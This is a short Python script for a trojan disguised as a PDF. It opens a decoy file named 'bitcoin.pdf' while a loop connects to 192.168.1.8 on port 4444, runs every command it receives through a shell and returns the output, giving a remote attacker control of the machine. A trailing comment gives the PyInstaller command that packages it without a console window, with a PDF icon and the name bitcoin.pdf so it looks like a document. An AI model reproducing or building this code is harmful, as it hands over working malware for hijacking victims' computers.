import subprocess
import os
import sys
import socket
import threading
import webbrowser
import time

def open_pdf():
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    
    pdf_path = os.path.join(base_path, "bitcoin.pdf")
    webbrowser.open(pdf_path)

def connect_back():
    while True:
        try:
            s = socket.socket()
            s.connect(("192.168.1.8", 4444))
            current_dir = os.getcwd()

            while True:
                try:
                    cmd = s.recv(1024).decode("utf-8")
                    if cmd.lower() == "exit":
                        break

                    if cmd.lower().startswith("cd "):
                        new_dir = cmd[3:].strip()
                        try:
                            os.chdir(new_dir)
                            current_dir = os.getcwd()
                            s.send(b"[+] Changed directory\n")
                        except FileNotFoundError:
                            s.send(b"[-] Directory not found\n")
                        continue
                    try:
                        output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
                        out, err = output.communicate()

                        s.send(out + err if out or err else b"[empty]\n")
                    except Exception as e:
                        s.send(f"[error] {str(e)}\n".encode("utf-8"))

                except Exception:
                    break
            s.close()

        except Exception:
            pass
        time.sleep(5)

threading.Thread(target=open_pdf).start()

connect_back()

# pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "bitcoin.pdf;." --name bitcoin.pdf reverse_pdf.py